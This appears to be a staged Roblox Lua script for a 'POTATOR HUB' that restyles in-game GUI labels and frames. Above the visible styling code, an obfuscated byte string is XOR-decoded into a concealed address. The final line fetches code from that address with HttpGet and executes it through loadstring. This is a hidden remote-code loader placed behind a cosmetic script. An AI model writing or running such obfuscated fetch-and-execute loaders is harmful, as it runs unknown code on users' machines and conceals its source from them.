
--[[ STAGE 2: VISUAL CORE ]]
local FuR8aeUwDXtWLzcXI0tJ6="\101\107\021\107\022\089\086\080\031\110\006\089\018\030\013\027\008\025\052\052\000\049\002\048\051\059\052\057\033\101\050\032\032\108\047\040\043\038\212\046\208\046\223\196\209\004\211\205\196\216\194\240\196\203\245\048\240\206\240\249\058\210\194\195\242\194\148\149\225\226\147\238\159\236\246\230\252\148\228\142\143\155\132\181\128\177\178\128\155\152\142\132\189\178\163\186\187\165\170\184\182\084\092\093\174\170\174\128\131\135\093\140\095\091\139\137\073\114\064"local OfH3ymplW4ana_1R=213 local DTr3GchA2NAaEwmulI=48 local WwQEP25yRlweKlAhxHUtl=1 local SvHr80rmyxel381YK=2 local _gxcQeAmJoUYu36=22 local FpE7IvfvditPNRcB9njL=false local YgSvRWYyVVGAwR2OdoN=bit32 and bit32.bxor if not YgSvRWYyVVGAwR2OdoN then YgSvRWYyVVGAwR2OdoN=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local kUE_HluSondE={}for dC5_HEOntDrSF=1,#FuR8aeUwDXtWLzcXI0tJ6 do local llovXKmyliovHyzDciHwbz=string.byte(FuR8aeUwDXtWLzcXI0tJ6,dC5_HEOntDrSF)local xUJ7UIbwGXn2m0te56Mz=(DTr3GchA2NAaEwmulI+(dC5_HEOntDrSF*SvHr80rmyxel381YK)+_gxcQeAmJoUYu36)%256 if WwQEP25yRlweKlAhxHUtl==0 then llovXKmyliovHyzDciHwbz=(llovXKmyliovHyzDciHwbz-xUJ7UIbwGXn2m0te56Mz)%256 kUE_HluSondE[dC5_HEOntDrSF]=string.char(YgSvRWYyVVGAwR2OdoN(llovXKmyliovHyzDciHwbz,OfH3ymplW4ana_1R))else llovXKmyliovHyzDciHwbz=YgSvRWYyVVGAwR2OdoN(llovXKmyliovHyzDciHwbz,OfH3ymplW4ana_1R)kUE_HluSondE[dC5_HEOntDrSF]=string.char((llovXKmyliovHyzDciHwbz-xUJ7UIbwGXn2m0te56Mz)%256)end end local loga3CFkX7LaD1=table.concat(kUE_HluSondE)if FpE7IvfvditPNRcB9njL then loga3CFkX7LaD1=string.reverse(loga3CFkX7LaD1)end local _kW9wzgk1ebcNoZ3P=loga3CFkX7LaD1
local HubName = "POTATOR HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(_kW9wzgk1ebcNoZ3P))()
